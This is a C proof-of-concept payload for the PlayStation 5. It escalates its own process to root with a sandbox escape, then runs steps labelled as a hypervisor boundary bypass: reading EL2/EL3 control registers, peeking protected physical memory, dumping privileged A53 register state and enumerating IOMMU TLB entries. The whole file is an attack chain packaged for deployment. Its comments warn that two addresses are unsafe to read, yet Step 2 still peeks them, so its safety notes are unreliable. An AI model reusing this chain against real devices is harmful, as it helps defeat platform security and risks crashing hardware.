/* PoC Chain Payload — A53 Development Bridge Verification
 *
 * Compile with: PS5_PAYLOAD_SDK=/path/to/sdk make
 * Deploy with:  make test PS5_HOST=ps5
 *
 * Leaves results in /data/poc/ for chain correctness analysis.
 * Each step sends a notification via sceKernelSendNotificationRequest.
 */

#include "poc.h"
#include "pal_privilege.h"
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>

/* ---- PS5 notification API (from ps5-payload-sdk) ----
 * Forward-declared locally so the payload compiles standalone. Wrapped
 * with #ifndef so #include <ps5/kernel.h> (when present) takes precedence
 * and we don't get a typedef-redefinition error. */
#ifndef notify_request_t
struct notify_request {
    char useless1[45];
    char message[3075];
};
typedef struct notify_request notify_request_t;
#endif

#ifndef sceKernelSendNotificationRequest
int sceKernelSendNotificationRequest(int user_id, notify_request_t *req,
                                      size_t size, int flags);
#endif

/* ---- Persistent log file (append all notifications) ---- */
static FILE *g_log_fp = NULL;

/* Open the persistent log file. Called once at startup. */
static int poc_log_open(void)
{
    if (g_log_fp) return 0;  /* already open */
    g_log_fp = fopen("/data/poc/run.log", "a");
    if (!g_log_fp) {
        /* try fallback path */
        g_log_fp = fopen("/user/data/poc/run.log", "a");
    }
    if (!g_log_fp) {
        g_log_fp = fopen("./poc/run.log", "a");
    }
    return (g_log_fp != NULL) ? 0 : -1;
}

/* Close and flush the persistent log file. */
static void poc_log_close(void)
{
    if (g_log_fp) {
        /* Add a trailing blank line so each run is visually separated */
        fprintf(g_log_fp, "\n");
        fflush(g_log_fp);
        fclose(g_log_fp);
        g_log_fp = NULL;
    }
}

/* Append a message to the persistent log + notification + printf. */
static void poc_notify(const char *msg)
{
    notify_request_t req;
    if (!msg) return;  /* NULL guard for SEGV safety */

    /* Persistent log file — append timestamped line */
    if (g_log_fp) {
        fprintf(g_log_fp, "[PoC] %s\n", msg);
        fflush(g_log_fp);
    }

    /* PS5 notification */
    bzero(&req, sizeof req);
    strncpy(req.message, msg, sizeof(req.message) - 1);
    req.message[sizeof(req.message) - 1] = '\0';
    sceKernelSendNotificationRequest(0, &req, sizeof req, 0);

#ifndef PS5_QUIET
    printf("[PoC] %s\n", msg);
#endif
}

/* ---- Helper: write a string to /data/poc/ file ---- */
static int poc_write_file(const char *filename, const char *data)
{
    char path[256];
    FILE *fp;

    if (!filename || !data) return -1;  /* NULL-SEGV guard */
    snprintf(path, sizeof path, "/data/poc/%s", filename);
    fp = fopen(path, "w");
    if (!fp) {
#ifndef PS5_QUIET
        printf("[PoC] ERROR: cannot open %s\n", path);
#endif
        return -1;
    }
    if (fputs(data, fp) == EOF) {
        fclose(fp);
#ifndef PS5_QUIET
        printf("[PoC] ERROR: write failed for %s\n", path);
#endif
        return -1;
    }
    fclose(fp);
    return 0;
}

/* Printf cast helper: portable 64-bit formatting across AArch64 targets.
 * ps5-payload-sdk (FreeBSD) and Linux ELF disagree on uint64_t base type. */
#define U64(v) ((unsigned long long)(v))

static const char *poc_dmap_state_name(poc_dmap_state_t state)
{
    switch (state) {
    case POC_DMAP_UNPROBED:    return "unprobed";
    case POC_DMAP_READY:       return "validated";
    case POC_DMAP_UNAVAILABLE: return "unavailable";
    default:                   return "unknown";
    }
}

static const char *poc_dmap_probe_result_name(poc_dmap_probe_result_t result)
{
    switch (result) {
    case POC_DMAP_PROBE_NOT_RUN:                return "not run";
    case POC_DMAP_PROBE_VALIDATED:              return "validated";
    case POC_DMAP_PROBE_FIRST_READ_FAILED:      return "first read failed";
    case POC_DMAP_PROBE_SECOND_READ_FAILED:     return "second read failed";
    case POC_DMAP_PROBE_UNSTABLE:               return "read values differ";
    case POC_DMAP_PROBE_KERNEL_COPYOUT_FAILED:  return "kernel_copyout not available";
    case POC_DMAP_PROBE_ALL_CANDIDATES_FAILED:  return "all DRAM candidates failed";
    default:                                    return "unknown";
    }
}

/* ---- snprintf guards: prevent off-by-one in accumulation chains ---- */
#define SNPRINTF_APPEND(buf, off, fmt, ...) do { \
    if ((off) >= 0 && (size_t)(off) < sizeof(buf)) { \
        int _n = snprintf((buf) + (off), sizeof(buf) - (off), fmt, ##__VA_ARGS__); \
        if (_n > 0) (off) += _n; \
        if ((off) < 0 || (size_t)(off) >= sizeof(buf)) (off) = (int)sizeof(buf) - 1; \
    } \
} while(0)

/* ================================================================
 * Step 1: HV Boundary Bypass — read hypervisor control registers
 * ================================================================ */
static int step1_hv_boundary(void)
{
    char buf[4096];
    uint64_t scr_el3, hcr_el2, sctlr_el1, sctlr_el2, sctlr_el3;
    uint64_t vbar_el1, vbar_el2, vbar_el3;
    int off;

    poc_notify("Step 1/5: HV Boundary Bypass — reading SCR_EL3, HCR_EL2...");

    scr_el3   = poc_read_sysreg(POC_REG_SCR_EL3);
    hcr_el2   = poc_read_sysreg(POC_REG_HCR_EL2);
    sctlr_el1 = poc_read_sysreg(POC_REG_SCTLR_EL1);
    sctlr_el2 = poc_read_sysreg(POC_REG_SCTLR_EL2);
    sctlr_el3 = poc_read_sysreg(POC_REG_SCTLR_EL3);
    vbar_el1  = poc_read_sysreg(POC_REG_VBAR_EL1);
    vbar_el2  = poc_read_sysreg(POC_REG_VBAR_EL2);
    vbar_el3  = poc_read_sysreg(POC_REG_VBAR_EL3);

    off = 0;
    SNPRINTF_APPEND(buf, off,
        "=== HV Boundary State ===\n"
        "SCR_EL3    = 0x%016llx\n"
        "HCR_EL2    = 0x%016llx\n"
        "SCTLR_EL1  = 0x%016llx\n"
        "SCTLR_EL2  = 0x%016llx\n"
        "SCTLR_EL3  = 0x%016llx\n"
        "VBAR_EL1   = 0x%016llx\n"
        "VBAR_EL2   = 0x%016llx\n"
        "VBAR_EL3   = 0x%016llx\n"
        "\n=== Bit-level decode ===\n"
        "SCR_EL3.NS  = %d (bit 0)\n"
        "SCR_EL3.IRQ = %d (bit 1)\n"
        "SCR_EL3.FIQ = %d (bit 2)\n"
        "SCR_EL3.EA  = %d (bit 3)\n"
        "SCR_EL3.RW  = %d (bit 10: EL2 is AArch64)\n"
        "SCR_EL3.SMD = %d (bit 7: SMC disable)\n"
        "HCR_EL2.VM  = %d (bit 0: stage-2 MMU enable)\n"
        "HCR_EL2.RW  = %d (bit 31: EL1 is AArch64)\n"
        "HCR_EL2.E2H = %d (bit 34: VHE enable)\n",
        U64(scr_el3), U64(hcr_el2), U64(sctlr_el1), U64(sctlr_el2), U64(sctlr_el3),
        U64(vbar_el1), U64(vbar_el2), U64(vbar_el3),
        (int)(scr_el3 & 1), (int)((scr_el3 >> 1) & 1),
        (int)((scr_el3 >> 2) & 1), (int)((scr_el3 >> 3) & 1),
        (int)((scr_el3 >> 10) & 1), (int)((scr_el3 >> 7) & 1),
        (int)(hcr_el2 & 1), (int)((hcr_el2 >> 31) & 1),
        (int)((hcr_el2 >> 34) & 1));

    return poc_write_file("hv_state.txt", buf);
}

/* ================================================================
 * Step 2: Protected Memory Read — peek known physical addresses
 * ================================================================ */
static int step2_memory(void)
{
    char buf[4096];
    poc_mailbox_t *mb;
    uint64_t magic1, magic2, magic3, version, phase;
    uint64_t debug_status_pa, main_param_pa, main_param_size;
    uint64_t peek_sram, peek_dram, peek_mmio;
    int off;

    poc_notify("Step 2/5: Protected Memory — peeking debug status, main param, SRAM...");

    mb = poc_get_mailbox();
    if (!mb) {
        return poc_write_file("memory_map.txt", "=== ERROR: mailbox not accessible ===\n");
    }

    magic1 = mb->mds_magic1;
    magic2 = mb->mds_magic2;
    magic3 = mb->mds_magic3;
    version = mb->mds_version;
    phase   = mb->mds_phase;

    debug_status_pa = poc_get_debug_status_base();
    main_param_pa   = poc_get_main_param_base();
    main_param_size = poc_read_msi_param(0); /* mm4p_self_size at offset 0 */

    /* Peek a few physical locations to verify access.
     *
     * NOTE: poc_peek() issues SVC #0x152 which traps EL0→EL1→EL3.
     * On stock PS5 kernels this requires forwarding (kernel patch) or
     * execution at EL1. For EL0-only operation, alternatives are:
     *   - read mailbox fields directly (mds_* structs in step 3)
     *   - mmap /data/poc/ to inspect results after this run
     */
    peek_sram = poc_peek(0x88000000ULL);         /* SRAM base */
    peek_dram = poc_peek(0x40000000ULL);         /* DRAM base */
    peek_mmio = poc_peek(0x32300000ULL);         /* Syshub TLB base */

    off = 0;
    SNPRINTF_APPEND(buf, off,
        "=== Protected Memory Access ===\n"
        "Debug Status PA     = 0x%016llx\n"
        "Main Param PA       = 0x%016llx\n"
        "Main Param self_size= 0x%016llx\n"
        "\n=== Mailbox Magic Verification ===\n"
        "mds_magic1  = 0x%016llx %s\n"
        "mds_magic2  = 0x%016llx %s\n"
        "mds_magic3  = 0x%016llx %s\n"
        "mds_version = 0x%016llx\n"
        "mds_phase   = 0x%016llx\n"
        "\n=== Physical Memory Peeks ===\n"
        "SRAM[0x88000000] = 0x%016llx\n"
        "DRAM[0x40000000] = 0x%016llx\n"
        "SYSHUB[0x32300000]= 0x%016llx\n",
        U64(debug_status_pa), U64(main_param_pa), U64(main_param_size),
        U64(magic1), (magic1 == 0xcbb3d18a1aa5daefULL) ? "OK" : "BAD",
        U64(magic2), (magic2 == 0x1aa5daef675a1801ULL) ? "OK" : "BAD",
        U64(magic3), (magic3 == 0x8501dda72c7b400eULL) ? "OK" : "BAD",
        U64(version), U64(phase),
        U64(peek_sram), U64(peek_dram), U64(peek_mmio));

    return poc_write_file("memory_map.txt", buf);
}

/* ================================================================
 * Step 3: A53/MP4 Privileged State — dump GPRs from mailbox
 * ================================================================ */
static int step3_privileged_state(void)
{
    char buf[8192];
    poc_mailbox_t *mb;
    int off, i;

    poc_notify("Step 3/5: A53/MP4 State — dumping GPRs from debug status mailbox...");

    mb = poc_get_mailbox();
    if (!mb) {
        return poc_write_file("privileged_state.txt",
            "=== ERROR: mailbox not accessible ===\n");
    }

    off = 0;
    SNPRINTF_APPEND(buf, off,
        "=== A53/MP4 Privileged State ===\n"
        "SP_EL0 (mds_sp)         = 0x%016llx\n"
        "SPSR (mds_spsr)         = 0x%016llx\n"
        "ESR  (mds_esr)          = 0x%016llx\n"
        "FAR  (mds_far)          = 0x%016llx\n"
        "DAIF (mds_daif)         = 0x%016llx\n"
        "CurrentEL (mds_current_el)=0x%016llx\n"
        "ELR mode (mds_elr_mode) = 0x%016llx\n"
        "NZCV (mds_nzcv)         = 0x%016llx\n"
        "VBAR (mds_vector)       = 0x%016llx\n"
        "TPIDRRO_EL0             = 0x%016llx\n"
        "\n=== GPR Dump (x0-x30) ===\n",
        U64(mb->mds_sp), U64(mb->mds_spsr), U64(mb->mds_esr), U64(mb->mds_far),
        U64(mb->mds_daif), U64(mb->mds_current_el), U64(mb->mds_elr_mode),
        U64(mb->mds_nzcv), U64(mb->mds_vector), U64(mb->mds_tpidrro_el0));

    for (i = 0; i <= 30; i++) {
        SNPRINTF_APPEND(buf, off,
            "GPR[x%02d] = 0x%016llx\n", i, U64(mb->mds_gpr[i]));
    }

    return poc_write_file("privileged_state.txt", buf);
}

/* ================================================================
 * Step 4: IOMMU/Syshub Policy Bypass — enumerate TLB entries
 * ================================================================ */
static int step4_iommu_syshub(void)
{
    char buf[16384];
    int off, tlb, scanned, valid;
    uint32_t tlb0, tlb1, tlb2, tlb3, sub, attr1;
    uint64_t tcr_el1, ttbr0_el1, ttbr0_el3, vbar_el3;

    poc_notify("Step 4/5: IOMMU/Syshub — enumerating TLB entries 1-40...");

    poc_get_page_tables(&vbar_el3, &ttbr0_el3, &ttbr0_el1);
    tcr_el1 = poc_read_sysreg(POC_REG_TCR_EL1);

    off = 0;
    SNPRINTF_APPEND(buf, off,
        "=== IOMMU/Syshub TLB Enumeration ===\n"
        "TCR_EL1   = 0x%016llx\n"
        "TTBR0_EL1 = 0x%016llx\n"
        "TTBR0_EL3 = 0x%016llx\n"
        "VBAR_EL3  = 0x%016llx\n"
        "\n=== TLB Entries (1-40): only showing non-zero ===\n"
        "TLB    TLB0        TLB1        TLB2        TLB3        "
        "SUB         ATTR1\n",
        U64(tcr_el1), U64(ttbr0_el1), U64(ttbr0_el3), U64(vbar_el3));

    scanned = 0;
    valid   = 0;

    for (tlb = 1; tlb <= 40; tlb++) {
        int rc = poc_get_tlb((uint32_t)tlb,
                             &tlb0, &tlb1, &tlb2, &tlb3, &sub, &attr1);
        scanned++;
        if (rc != 0) continue;

        if (tlb0 != 0 || tlb1 != 0 || tlb2 != 0 || tlb3 != 0) {
            valid++;
            SNPRINTF_APPEND(buf, off,
                "%3d    0x%08x   0x%08x   0x%08x   0x%08x   "
                "0x%08x   0x%08x\n",
                tlb, tlb0, tlb1, tlb2, tlb3, sub, attr1);
        }
    }

    SNPRINTF_APPEND(buf, off,
        "\nScanned: %d  Valid (non-zero): %d\n", scanned, valid);

    return poc_write_file("iommu_tlbs.txt", buf);
}

/* ================================================================
 * Step 5: Persistent Configuration — read main parameter block
 * ================================================================ */
static int step5_configuration(void)
{
    char buf[8192];
    uint64_t base, self_size, magic, flags, cyclecount;
    uint64_t msi_address, pasid_kernel;
    uint64_t mm_rings_ioma, mapper_pt_pa, mapper_pt_ioma;
    uint64_t iommu_cmd_pa, iommu_cmd_size;
    uint64_t mapper_private_ioma, scf_buf_iommu_addr, machine_part;
    int off;

    poc_notify("Step 5/5: Configuration — reading main parameter block...");

    base = poc_get_main_param_base();
    if (base == 0 || base == 0xFFFFFFFFFFFFFFFFULL) {
        off = 0;
        SNPRINTF_APPEND(buf, off,
            "=== CONFIGURATION ERROR ===\n"
            "main_mp4_param_t base = 0x%016llx (INVALID)\n"
            "The main parameter block is not accessible.\n", U64(base));
        return poc_write_file("config.txt", buf);
    }

    /* Read fields by offset — matching main_mp4_param_t layout.
     * NOTE: poc_read_msi_param reads 8 bytes at the given offset.
     * For 32-bit fields (self_size, magic, flags), the value is
     * in the lower 32 bits; upper 32 are the next field. */
    self_size      = poc_read_msi_param(0x00);  /* mm4p_self_size + mm4p_magic */
    magic          = poc_read_msi_param(0x04);  /* mm4p_magic + mm4p_flags */
    flags          = poc_read_msi_param(0x08);  /* mm4p_flags + mm4p_reserved */
    cyclecount     = poc_read_msi_param(0x10);  /* mm4p_cyclecount (64-bit) */
    msi_address    = poc_read_msi_param(0x18);  /* mm4p_msi_address (64-bit) */
    pasid_kernel   = poc_read_msi_param(0x40);  /* mm4p_pasid_kernel (64-bit) */
    mm_rings_ioma  = poc_read_msi_param(0x48);  /* mm4p_mm_rings_ioma (64-bit) */
    mapper_pt_pa   = poc_read_msi_param(0x50);  /* mm4p_mapper_page_table_pa */
    mapper_pt_ioma = poc_read_msi_param(0x58);  /* mm4p_mapper_page_table_ioma */
    iommu_cmd_pa   = poc_read_msi_param(0x60);  /* mm4p_iommu_command_buffer_pa */
    iommu_cmd_size = poc_read_msi_param(0x68);  /* mm4p_iommu_command_buffer_size */
    mapper_private_ioma = poc_read_msi_param(0x1C0); /* mm4p_mapper_private_ioma */
    scf_buf_iommu_addr = poc_read_msi_param(0x1C8);  /* mm4p_scf_buf_iommu_addr */
    /* mm4p_machine_part_number is an a53_u64 at offset 0x1D0 (last field).
     * The 8-byte read is well-aligned. No follow-on read needed (no field
     * follows it in main_mp4_param_t). */
    machine_part   = poc_read_msi_param(0x1D0); /* mm4p_machine_part_number */

    off = 0;
    SNPRINTF_APPEND(buf, off,
        "=== Main Parameter Block (base=0x%016llx) ===\n"
        "mm4p_self_size                = 0x%016llx\n"
        "mm4p_magic                    = 0x%016llx\n"
        "mm4p_flags                    = 0x%016llx\n"
        "mm4p_cyclecount               = 0x%016llx\n"
        "mm4p_msi_address              = 0x%016llx\n"
        "mm4p_pasid_kernel             = 0x%016llx\n"
        "mm4p_mm_rings_ioma            = 0x%016llx\n"
        "mm4p_mapper_page_table_pa     = 0x%016llx\n"
        "mm4p_mapper_page_table_ioma   = 0x%016llx\n"
        "mm4p_iommu_command_buffer_pa  = 0x%016llx\n"
        "mm4p_iommu_command_buffer_size= 0x%016llx\n"
        "mm4p_mapper_private_ioma      = 0x%016llx\n"
        "mm4p_scf_buf_iommu_addr       = 0x%016llx\n"
        "mm4p_machine_part_number      = 0x%016llx\n"
        "\n=== IOMMU Map Info at offsets 0x80-0x1A0 ===\n"
        "Use poc_read_msi_param() with offsets 0x80+ to dump\n"
        "the 8 mp4_iommu_map_info_t structs (0x28 bytes each).\n",
        U64(base), U64(self_size), U64(magic), U64(flags), U64(cyclecount),
        U64(msi_address), U64(pasid_kernel), U64(mm_rings_ioma),
        U64(mapper_pt_pa), U64(mapper_pt_ioma),
        U64(iommu_cmd_pa), U64(iommu_cmd_size),
        U64(mapper_private_ioma), U64(scf_buf_iommu_addr), U64(machine_part));

    return poc_write_file("config.txt", buf);
}

/* ================================================================
 * main — entry point
 * ================================================================ */
int main(void)
{
    int errors = 0;
    char summary[1024];

    poc_notify("A53 PoC Chain starting — /data/poc/ for results");

    /* Create /data/poc directory. EEXIST is benign (already created on
     * a prior run). Any other failure surfaces via notify so the user sees
     * why step writes silently failed. */
    if (mkdir("/data", 0777) != 0 && errno != EEXIST) {
        poc_notify("WARNING: mkdir /data failed — results will not be written");
    }
    if (mkdir("/data/poc", 0777) != 0 && errno != EEXIST) {
        poc_notify("WARNING: mkdir /data/poc failed — results will not be written");
    }

    /* Open the persistent log — all poc_notify() calls from here on will
     * be captured to /data/poc/run.log (or fallback /user/data/poc/run.log). */
    if (poc_log_open() != 0) {
        poc_notify("WARNING: cannot open persistent log — notifications will not be recorded to disk");
    } else {
        poc_notify("Persistent log opened at /data/poc/run.log");
    }

    /* Step 0: Privilege escalation — jailbreak to root + escape sandbox
     * so the process can map physical memory (A53 SRAM, mailbox).
     * Uses kernel_set_ucred_* from ps5-payload-sdk kernel.h. */
    poc_notify("Step 0/6: Privilege Escalation — jailbreak self to root...");
    if (poc_privilege_supported()) {
        if (poc_privilege_jailbreak_self() != 0) {
            poc_notify("WARNING: privilege escalation failed — continuing with limited access");
        } else {
            poc_notify("Privilege escalation OK — process has root + sandbox escape");
        }
    } else {
        poc_notify("Privilege escalation not supported on this platform");
    }

    /* ---- Diagnostic: scan result before poc_init() ---- */
    {
        uint64_t scan_result = 0;
        uint64_t dram_test = POC_UNSUPP_PA;
        uint64_t sram_test = POC_UNSUPP_PA;
        uint64_t dvm_test = POC_UNSUPP_PA;
        poc_dmap_state_t dmap_state;
        poc_dmap_probe_result_t dmap_probe_result;
        uint64_t dmap_base;
        int dmap_probe_rc;
        int dram_ok = -1;
        int sram_ok = -1;
        int dvm_ok = -1;
        int kernel_copyout_ok;
        uint64_t physmem, usermem;
        int num_candidates;
        char diag[256];
        char scan_diag[2048];
        if (poc_privilege_supported()) {
            /* Enhanced diagnostics: kernel_copyout pre-check */
            kernel_copyout_ok = poc_privilege_kernel_copyout_available();
            physmem = poc_privilege_get_physmem();
            usermem = poc_privilege_get_usermem();

            snprintf(diag, sizeof(diag),
                "DIAG: kernel_copyout on kernel .text = %s (rc=%d), "
                "physmem=%llu MB, usermem=%llu MB",
                kernel_copyout_ok ? "OK" : "FAIL",
                kernel_copyout_ok ? 0 : -1,
                U64(physmem / (1024*1024)),
                U64(usermem / (1024*1024)));
            poc_notify(diag);

            scan_result = poc_privilege_scan_debug_status();
            dmap_state = poc_privilege_dmap_state();
            dmap_probe_result = poc_privilege_dmap_probe_result();
            dmap_base = poc_privilege_dmap_base();
            dmap_probe_rc = poc_privilege_dmap_probe_rc();
            num_candidates = poc_privilege_dmap_num_candidates_tried();

            snprintf(diag, sizeof(diag),
                "DIAG: scan_debug_status = 0x%llx %s (DMAP=%s candidates=%d)",
                U64(scan_result),
                scan_result ? "(FOUND)" : "(NOT FOUND)",
                poc_dmap_state_name(dmap_state),
                num_candidates);
            poc_notify(diag);

            /* Try phys_read at multiple candidate DRAM addresses.
             * On PS5, 0x40000000 is NOT valid DRAM (it's in the GPU MMIO hole).
             * We try addresses from the multi-candidate probe list instead.
             *
             * SAFETY: The DMAP is write-back cached. Reading MMIO regions
             * through a WB-cached mapping triggers Machine Check Exceptions
             * (MCE) on AMD Zen 2, which causes an immediate kernel panic.
             * We only probe DRAM addresses that are known-safe.
             *
             * 0x40000000 (GPU MMIO hole) and 0x030C0000 (DVM mailbox MMIO)
             * are skipped to prevent hardware-level aborts.
             * 0x88000000 (A53 SRAM) lives on a separate APU internal bus
             * and is also NOT in the x86 DMAP; it's skipped here. */
            if (poc_privilege_dmap_state() == POC_DMAP_READY) {
                /* Try the first candidate DRAM address from the probe
                 * (0x100000000, above 4GB boundary). This is the most
                 * reliable DRAM read on PS5. */
                dram_ok = poc_privilege_phys_read(0x100000000ULL,
                                                   &dram_test, sizeof(dram_test));
                if (dram_ok == 0) {
                    snprintf(diag, sizeof(diag),
                        "DIAG: phys_read(DRAM@0x100000000) = OK, value=0x%llx",
                        U64(dram_test));
                } else {
                    snprintf(diag, sizeof(diag),
                        "DIAG: phys_read(DRAM@0x100000000) = FAIL (DMAP may not cover this region)");
                }
                poc_notify(diag);

                /* A53 SRAM (0x88000000) is on a separate APU internal bus,
                 * NOT accessible via x86 DMAP. Skipping to avoid bus fault.
                 * Use /dev/a53mm IOCTLs for A53 communication. */
                sram_ok = -2;  /* -2 = SKIPPED (not safe to probe) */
                snprintf(diag, sizeof(diag),
                    "DIAG: phys_read(FW-PA@0x88000000) = SKIPPED (A53 SRAM not in x86 DMAP)");
                poc_notify(diag);

                /* DVM mailbox at 0x030C0000 is MMIO — skipped to avoid
                 * MCE from WB-cached DMAP access. */
                dvm_ok = -2;  /* -2 = SKIPPED (MMIO, would cause MCE) */
                snprintf(diag, sizeof(diag),
                    "DIAG: phys_read(DVM@0x030C0000) = SKIPPED (MMIO, would cause MCE)");
                poc_notify(diag);
            } else {
                /* DMAP probe failed — show diagnostic info */
                snprintf(diag, sizeof(diag),
                    "DIAG: DMAP unavailable — kernel_copyout_available=%d, "
                    "probe_result=%s, candidates=%d",
                    kernel_copyout_ok,
                    poc_dmap_probe_result_name(dmap_probe_result),
                    num_candidates);
                poc_notify(diag);

                if (!kernel_copyout_ok) {
                    snprintf(diag, sizeof(diag),
                        "DIAG: kernel_copyout FAILS on kernel .text — "
                        "authid=0x%016llx may not grant access, or jailbreak "
                        "doesn't expose kernel_copyout for this firmware",
                        U64(0x4800000000010003ULL));
                    poc_notify(diag);
                }
            }

            snprintf(scan_diag, sizeof(scan_diag),
                "=== A53 read-only discovery diagnostic ===\n"
                "kernel_copyout on kernel .text: %s\n"
                "hw.physmem:                    %llu MB\n"
                "hw.usermem:                    %llu MB\n"
                "DMAP state:                    %s\n"
                "DMAP probe:                    %s (kernel_copyout rc=%d)\n"
                "DMAP base:                     0x%016llx\n"
                "DMAP DRAM candidates tried:    %d\n"
                "scan_debug_status:             0x%016llx\n"
                "phys_read DRAM 0x100000000:    rc=%d\n"
                "phys_read FW-PA 0x88000000:    rc=%d (SKIPPED)\n"
                "phys_read DVM 0x030c0000:      rc=%d (SKIPPED)\n"
                "\n"
                "ARCHITECTURE NOTES:\n"
                "1. 0x40000000 is NOT valid DRAM on PS5 - it's in the GPU MMIO hole.\n"
                "   The DMAP probe now tries multiple addresses automatically.\n"
                "2. A53 SRAM (0x88000000) lives on a separate APU internal bus\n"
                "   and is NOT mapped in the x86 DMAP. Only GDDR6 DRAM is.\n"
                "3. For A53 communication, use /dev/a53mm IOCTL interface:\n"
                "   - A53MM_MAPPER_QUERY_PA\n"
                "   - A53MM_GIVE_DIRECT_MEM_TO_MAPPER\n"
                "   - A53MM_CALL_INDIRECT_BUFFER\n"
                "   IOCTL numbers need reverse-engineering from the kernel binary.\n"
                "4. If kernel_copyout fails on kernel .text, the jailbreak/kstuff\n"
                "   may not expose the kernel_copyout syscall for this firmware.\n"
                "\n"
                "A discovered snapshot does not establish an x86_64-to-A53 command transport.\n",
                kernel_copyout_ok ? "OK" : "FAIL",
                U64(physmem / (1024*1024)),
                U64(usermem / (1024*1024)),
                poc_dmap_state_name(dmap_state),
                poc_dmap_probe_result_name(dmap_probe_result), dmap_probe_rc,
                U64(dmap_base), num_candidates,
                U64(scan_result),
                dram_ok, sram_ok, dvm_ok);
            if (poc_write_file("scan_diag.txt", scan_diag) != 0) {
                poc_notify("WARNING: unable to write /data/poc/scan_diag.txt");
            }
        } else {
            poc_notify("DIAG: privilege escalation not supported — scan skipped");
        }
    }

    /* Initialize the bridge */
    if (poc_init() != 0) {
        if (poc_bridge_state() == POC_BRIDGE_SNAPSHOT_ONLY) {
            poc_notify("UNSUPPORTED: read-only A53 snapshot found, but no x86_64-to-A53 command transport exists");
        } else {
            poc_notify("FATAL: PoC bridge init failed — read-only discovery did not validate a mailbox snapshot");
        }
        return -1;
    }
    poc_notify("PoC bridge initialized OK");

    /* Update step count in notification */
    poc_notify("Step 1/5: HV Boundary Bypass...");

    /* Run the 5-step chain */
    if (step1_hv_boundary()    != 0) { errors++; poc_notify("Step 1 FAILED"); }
    else                               poc_notify("Step 1 OK → /data/poc/hv_state.txt");

    if (step2_memory()         != 0) { errors++; poc_notify("Step 2 FAILED"); }
    else                               poc_notify("Step 2 OK → /data/poc/memory_map.txt");

    if (step3_privileged_state() != 0) { errors++; poc_notify("Step 3 FAILED"); }
    else                               poc_notify("Step 3 OK → /data/poc/privileged_state.txt");

    if (step4_iommu_syshub()   != 0) { errors++; poc_notify("Step 4 FAILED"); }
    else                               poc_notify("Step 4 OK → /data/poc/iommu_tlbs.txt");

    if (step5_configuration()  != 0) { errors++; poc_notify("Step 5 FAILED"); }
    else                               poc_notify("Step 5 OK → /data/poc/config.txt");

    /* Summary */
    snprintf(summary, sizeof summary,
        "A53 PoC Chain: %d/6 steps (Step 0=privilege, Steps 1-5=payload). Results in /data/poc/",
        5 - errors + 1);
    poc_notify(summary);

#ifndef PS5_QUIET
    printf("\n=== PoC Chain Complete ===\n");
    printf("  Errors: %d\n", errors);
    printf("  Results: /data/poc/hv_state.txt\n");
    printf("           /data/poc/memory_map.txt\n");
    printf("           /data/poc/privileged_state.txt\n");
    printf("           /data/poc/iommu_tlbs.txt\n");
    printf("           /data/poc/config.txt\n");
#endif

    /* Flush and close the persistent log */
    poc_log_close();

    return errors;
}
